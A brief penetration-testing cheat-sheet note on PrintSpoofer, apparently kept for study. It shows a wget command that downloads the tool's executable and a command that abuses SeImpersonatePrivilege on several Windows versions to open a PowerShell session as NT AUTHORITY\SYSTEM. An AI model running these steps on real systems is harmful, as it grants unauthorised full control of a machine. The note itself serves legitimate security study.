> Abuses `SeImpersonatePrivilege` on default installations of Windows 8.1, Windows Server 2012 R2, Windows 10 and Windows Server 2019


#Windows_Privilege_Escalation 

# Download

Download `PrintSpoofer64.exe`
```powershell
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

# Usage

Using `PrintSpoofer` tool to get an interactive PowerShell session in the context of `NT AUTHORITY\SYSTEM`
```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```